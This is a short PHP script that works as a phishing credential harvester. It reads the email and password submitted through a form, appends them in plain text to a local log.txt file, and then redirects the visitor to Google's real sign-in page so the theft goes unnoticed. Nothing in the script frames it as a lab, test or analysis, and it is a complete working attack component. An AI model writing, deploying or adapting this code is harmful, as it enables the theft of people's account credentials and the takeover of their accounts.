<?php
// Get the submitted form data
$email = htmlspecialchars($_POST['email']);
$password = htmlspecialchars($_POST['password']);

file_put_contents(__DIR__ . "/log.txt", "Email: $email | Password: $password\n", FILE_APPEND);

// Redirect to Google login (or any URL you choose)
header("Location: https://accounts.google.com/signin");
exit();
?>
